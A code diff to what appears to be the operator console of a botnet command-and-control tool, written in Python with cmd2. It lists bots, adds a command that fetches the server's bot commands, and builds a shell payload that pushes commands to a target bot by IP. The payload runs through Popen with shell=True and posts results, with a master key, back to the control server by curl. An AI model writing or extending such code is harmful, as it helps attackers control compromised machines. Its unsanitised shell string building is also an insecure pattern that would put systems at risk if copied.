@@ -16,7 +16,7 @@ from cmd2 import ansi
 
 REGISTERKEY = "registerkey"
 MASTERKEY = "masterkey"
-TIMER = '10'
+TIMER = '12'
 #URL = 'http://localhost:5000'
 
 
@@ -178,6 +178,29 @@ ___  ___          _              _____                       _
         self.poutput(output_botlist)
 
 
+    @cmd2.with_category(CUSTOM_CATEGORY)
+    #@cmd2.with_argparser()
+    def do_commands(self, arg):
+        try:
+            if URL is None:
+                self.poutput('URL is not set!')
+        except Exception as e:
+            output_loginfirst = ansi.style("\n\n!!! Login First !!!\n", fg='red', bg='blue', bold=True)
+            self.poutput(output_loginfirst)
+
+
+        url = URL + '/bot/commands'
+        res = requests.get(url)
+
+        commandlist = "===================================\n"
+        commandlist += res.text
+
+        output_botlist = ansi.style(commandlist, fg='green', bold=True)
+
+        self.poutput(output_botlist)
+
+
+
 
     push_parser = argparse.ArgumentParser()
     push_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address to push the command")
@@ -198,7 +221,7 @@ ___  ___          _              _____                       _
         self.poutput(output_push)
 
         # This "hack" was used due to lack of knowledge of asyncio. Will come back to this... 
-        payload = "sleep " + TIMER + "; echo '\n[" + args.target + "]  $" + args.command + "\n==========================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + args.target + "/result"
+        payload = "sleep " + TIMER + "; echo '\n[" + args.target + "] #" + args.command + "\n==========================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + args.target + "/result"
         #print("[*] payload = ", payload)
         process = Popen(payload, shell=True)
 
